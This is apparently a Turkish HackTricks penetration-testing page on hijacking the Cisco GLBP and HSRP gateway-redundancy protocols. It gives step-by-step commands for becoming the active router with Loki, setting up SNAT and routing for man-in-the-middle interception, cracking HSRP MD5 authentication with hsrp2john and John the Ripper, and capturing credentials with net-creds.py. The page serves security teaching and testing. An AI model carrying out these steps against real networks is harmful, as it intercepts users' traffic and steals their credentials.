# GLBP & HSRP Saldırıları

{{#include ../../banners/hacktricks-training.md}}


## FHRP Kaçırma Genel Bakış

### FHRP Hakkında Bilgiler

FHRP, birden fazla yönlendiriciyi tek bir sanal birimde birleştirerek ağ dayanıklılığı sağlamak için tasarlanmıştır ve böylece yük dağılımını ve hata toleransını artırır. Cisco Systems, bu pakette GLBP ve HSRP gibi öne çıkan protokoller tanıtmıştır.

### GLBP Protokolü Hakkında Bilgiler

Cisco'nun yarattığı GLBP, TCP/IP yığınında çalışır ve iletişim için 3222 numaralı portta UDP kullanır. GLBP grubundaki yönlendiriciler, 3 saniyelik aralıklarla "hello" paketleri değiş tokuş eder. Bir yönlendirici bu paketleri 10 saniye boyunca göndermezse, çevrimdışı olduğu varsayılır. Ancak, bu zamanlayıcılar sabit değildir ve değiştirilebilir.

### GLBP İşlemleri ve Yük Dağılımı

GLBP, tek bir sanal IP ile birden fazla sanal MAC adresi kullanarak yönlendiriciler arasında yük dağılımını sağlama yeteneği ile öne çıkar. Bir GLBP grubunda, her yönlendirici paket iletimine katılır. HSRP/VRRP'nin aksine, GLBP, çeşitli mekanizmalar aracılığıyla gerçek yük dengelemesi sunar:

- **Host-Dependent Load Balancing:** Bir hosta tutarlı AVF MAC adresi atamasını sürdürür, bu da kararlı NAT yapılandırmaları için gereklidir.
- **Round-Robin Load Balancing:** Varsayılan yaklaşım, istek yapan hostlar arasında AVF MAC adresi atamasını sırayla yapar.
- **Weighted Round-Robin Load Balancing:** Yükü önceden tanımlanmış "Ağırlık" metriklerine göre dağıtır.

### GLBP'deki Ana Bileşenler ve Terimler

- **AVG (Aktif Sanal Geçit):** MAC adreslerini eş yönlendiricilere tahsis etmekten sorumlu ana yönlendirici.
- **AVF (Aktif Sanal İletici):** Ağ trafiğini yönetmekle görevlendirilmiş bir yönlendirici.
- **GLBP Önceliği:** AVG'yi belirleyen bir metrik, varsayılan olarak 100 ile başlar ve 1 ile 255 arasında değişir.
- **GLBP Ağırlığı:** Bir yönlendiricinin mevcut yükünü yansıtır, manuel olarak veya Nesne Takibi aracılığıyla ayarlanabilir.
- **GLBP Sanal IP Adresi:** Tüm bağlı cihazlar için ağın varsayılan geçidi olarak hizmet eder.

GLBP, etkileşimler için 224.0.0.102 rezerve edilmiş çoklu yayın adresini ve UDP 3222 portunu kullanır. Yönlendiriciler, 3 saniyelik aralıklarla "hello" paketleri gönderir ve 10 saniyelik bir süre içinde bir paket kaçırılırsa, çalışmıyor olarak kabul edilir.

### GLBP Saldırı Mekanizması

Bir saldırgan, en yüksek öncelik değeri (255) ile bir GLBP paketi göndererek ana yönlendirici haline gelebilir. Bu, trafiğin kesilmesine veya yönlendirilmesine olanak tanıyan DoS veya MITM saldırılarına yol açabilir.

### Loki ile GLBP Saldırısı Gerçekleştirme

[Loki](https://github.com/raizo62/loki_on_kali), öncelik ve ağırlığı 255 olarak ayarlanmış bir paket enjekte ederek GLBP saldırısı gerçekleştirebilir. Saldırı öncesi adımlar, sanal IP adresi, kimlik doğrulama varlığı ve yönlendirici öncelik değerleri gibi bilgilerin toplanmasını içerir; bu işlem için Wireshark gibi araçlar kullanılabilir.

Saldırı Adımları:

1. Promiscuous moduna geçin ve IP yönlendirmesini etkinleştirin.
2. Hedef yönlendiriciyi belirleyin ve IP'sini alın.
3. Gereksiz bir ARP oluşturun.
4. AVG'yi taklit eden kötü niyetli bir GLBP paketi enjekte edin.
5. Saldırganın ağ arayüzüne, GLBP sanal IP'sini yansıtan bir ikincil IP adresi atayın.
6. Tam trafik görünürlüğü için SNAT uygulayın.
7. Orijinal AVG yönlendiricisi üzerinden internet erişiminin devamını sağlamak için yönlendirmeyi ayarlayın.

Bu adımları izleyerek, saldırgan kendisini "orta adam" olarak konumlandırır ve ağ trafiğini, şifrelenmemiş veya hassas verileri dahil olmak üzere, kesip analiz etme yeteneğine sahip olur.

Demonstrasyon için gerekli komut parçacıkları:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Ağ trafiğini izlemek ve kesmek, net-creds.py veya benzeri araçlar kullanılarak, ele geçirilmiş ağ üzerinden akan verileri yakalamak ve analiz etmek için yapılabilir.

### HSRP Kaçırma Pasif Açıklaması ve Komut Detayları

#### HSRP (Hot Standby Router/Redundancy Protocol) Genel Bakış

HSRP, ağ geçidi yedekliliği için tasarlanmış Cisco'ya ait bir protokoldür. Birden fazla fiziksel yönlendiricinin tek bir mantıksal birim olarak yapılandırılmasına ve paylaşılan bir IP adresi ile yönetilmesine olanak tanır. Bu mantıksal birim, trafiği yönlendirmekten sorumlu birincil yönlendirici tarafından yönetilir. Yük dengelemesi için öncelik ve ağırlık gibi metrikler kullanan GLBP'nin aksine, HSRP, trafik yönetimi için tek bir aktif yönlendiriciye dayanır.

#### HSRP'deki Roller ve Terminoloji

- **HSRP Aktif Yönlendirici**: Trafik akışını yöneten geçit olarak hareket eden cihaz.
- **HSRP Bekleme Yönlendirici**: Aktif yönlendirici arızalandığında devralmaya hazır yedek yönlendirici.
- **HSRP Grubu**: Tek bir dayanıklı sanal yönlendirici oluşturmak için işbirliği yapan yönlendiriciler seti.
- **HSRP MAC Adresi**: HSRP kurulumundaki mantıksal yönlendiriciye atanan sanal MAC adresi.
- **HSRP Sanal IP Adresi**: HSRP grubunun sanal IP adresi, bağlı cihazlar için varsayılan geçit olarak işlev görür.

#### HSRP Sürümleri

HSRP, grup kapasitesi, çoklu IP kullanımı ve sanal MAC adresi yapısı açısından farklılık gösteren iki sürümde gelir: HSRPv1 ve HSRPv2. Protokol, hizmet bilgisi alışverişi için belirli çoklu IP adreslerini kullanır ve her 3 saniyede bir Hello paketleri gönderir. 10 saniyelik bir süre içinde paket alınmazsa, bir yönlendirici pasif kabul edilir.

#### HSRP Saldırı Mekanizması

HSRP saldırıları, maksimum öncelik değeri enjekte ederek Aktif Yönlendirici'nin rolünü zorla devralmayı içerir. Bu, Man-In-The-Middle (MITM) saldırısına yol açabilir. Saldırı öncesi temel adımlar, HSRP kurulumuna dair verilerin toplanmasını içerir; bu, trafik analizi için Wireshark kullanılarak yapılabilir.

#### HSRP Kimlik Doğrulamasını Aşma Adımları

1. HSRP verilerini içeren ağ trafiğini .pcap dosyası olarak kaydedin.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. .pcap dosyasından MD5 hash'lerini hsrp2john.py kullanarak çıkarın.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. MD5 hash'lerini John the Ripper kullanarak kırın.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Loki ile HSRP Enjeksiyonu Gerçekleştirme**

1. HSRP reklamlarını tanımlamak için Loki'yi başlatın.
2. Ağ arayüzünü promiscuous moda ayarlayın ve IP yönlendirmesini etkinleştirin.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Loki'yi belirli yönlendiriciye hedef almak için kullanın, kırılmış HSRP şifresini girin ve Aktif Yönlendirici'yi taklit etmek için gerekli yapılandırmaları yapın.
4. Aktif Yönlendirici rolünü kazandıktan sonra, ağ arayüzünüzü ve IP tablolarınızı meşru trafiği kesmek için yapılandırın.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Trafiği eski Aktif Yönlendirici üzerinden yönlendirmek için yönlendirme tablosunu değiştirin.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Kesilen trafikten kimlik bilgilerini yakalamak için net-creds.py veya benzeri bir yardımcı program kullanın.
```shell
sudo python2 net-creds.py -i eth0
```

Bu adımları uygulamak, saldırganı trafiği kesip manipüle etme pozisyonuna getirir; bu, GLBP kaçırma prosedürüyle benzerdir. Bu, HSRP gibi yedeklilik protokollerindeki zayıflığı ve sağlam güvenlik önlemlerine olan ihtiyacı vurgular.

## Referanslar

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)


{{#include ../../banners/hacktricks-training.md}}
